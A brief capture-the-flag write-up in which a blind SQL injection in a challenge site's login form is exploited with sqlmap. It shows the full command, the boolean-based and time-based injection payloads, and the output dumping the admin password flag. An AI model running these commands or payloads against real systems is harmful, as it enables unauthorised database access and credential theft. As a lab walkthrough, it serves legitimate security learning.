* find a trivial blind-SQLi in login

* dump the db with sqlmap:
```
  $ sqlmap -r ./asdf.req.txt --risk=3 --level=5 -p username --technique=BT --dbms=mysql --random-agent --dump
          ___
         __H__
   ___ ___["]_____ ___ ___  {1.4.4#stable}
  |_ -| . [,]     | .'| . |
  |___|_  [.]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org

  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

  [*] starting @ 20:16:44 /2020-04-04/

  [20:16:44] [INFO] parsing HTTP request from './asdf.req.txt'
  [20:16:44] [INFO] fetched random HTTP User-Agent header value 'Opera/9.20(Windows NT 5.1; U; en)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
  [20:16:44] [INFO] testing connection to the target URL
  sqlmap resumed the following injection point(s) from stored session:
  ---
  Parameter: username (POST)
      Type: boolean-based blind
      Title: OR boolean-based blind - WHERE or HAVING clause (subquery - comment)
      Payload: username=-6303' OR 3925=(SELECT (CASE WHEN (3925=3925) THEN 3925 ELSE (SELECT 7853 UNION SELECT 5260) END))-- -&password=asdf

      Type: time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
      Payload: username=tamper' AND (SELECT 9635 FROM (SELECT(SLEEP(5)))xIne)-- ngVq&password=asdf
  ---
  [20:16:44] [INFO] testing MySQL
  [20:16:45] [INFO] confirming MySQL
  [20:16:45] [INFO] the back-end DBMS is MySQL
  web server operating system: Linux Ubuntu
  web application technology: Apache 2.4.7, PHP 5.5.9
  back-end DBMS: MySQL >= 5.0.0
  [20:16:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
  [20:16:45] [INFO] fetching current database
  [20:16:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
  [20:16:45] [INFO] retrieved: eyeless
  [20:16:52] [INFO] fetching tables for database: 'eyeless'
  [20:16:52] [INFO] fetching number of tables for database 'eyeless'
  [20:16:52] [INFO] retrieved: 1
  [20:16:53] [INFO] retrieved: users
  [20:16:58] [INFO] fetching columns for table 'users' in database 'eyeless'
  [20:16:59] [INFO] retrieved: 2
  [20:17:00] [INFO] retrieved: username
  [20:17:08] [INFO] retrieved: password
  [20:17:16] [INFO] fetching entries for table 'users' in database 'eyeless'
  [20:17:16] [INFO] fetching number of entries for table 'users' in database 'eyeless'
  [20:17:16] [INFO] retrieved: 1
  [20:17:17] [INFO] retrieved: LLS{blind_sql_injection_cant_be_done_with_braille}
  [20:18:13] [INFO] retrieved: admin
  Database: eyeless
  Table: users
  [1 entry]
  +----------+----------------------------------------------------+
  | username | password                                           |
  +----------+----------------------------------------------------+
  | admin    | LLS{blind_sql_injection_cant_be_done_with_braille} |
  +----------+----------------------------------------------------+

  [20:18:18] [INFO] table 'eyeless.users' dumped to CSV file '/home/p4w/.sqlmap/output/jh2i.com/dump/eyeless/users.csv'
  [20:18:18] [INFO] fetched data logged to text files under '/home/p4w/.sqlmap/output/jh2i.com'

  [*] ending @ 20:18:18 /2020-04-04/
```
